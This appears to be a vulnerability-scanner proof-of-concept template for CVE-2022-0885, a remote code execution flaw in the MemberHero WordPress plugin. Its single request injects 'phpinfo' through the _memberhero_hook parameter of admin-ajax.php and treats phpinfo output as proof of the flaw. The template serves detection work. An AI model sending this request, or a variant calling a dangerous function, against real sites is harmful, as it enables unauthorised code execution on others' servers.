name: yaml-poc-memberhero-member_hero-rce-CVE-2022-0885
binding: 3d404c95-37d3-4a50-a2ae-f4da6c36db02
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-0885/
        - https://wpscan.com/vulnerability/8b08b72e-5584-4f25-ab73-5ab0f47412df
    vulnerability:
        id: 009225ad-c4ab-4f13-b1a9-a5c514a7adcb
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-admin/admin-ajax.php?action=memberhero_send_form&_memberhero_hook=phpinfo
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("application/json") && response.body_string.contains("PHP Extension") && response.body_string.contains("PHP Version") && response.body_string.contains("<!DOCTYPE html")
expression: r0()
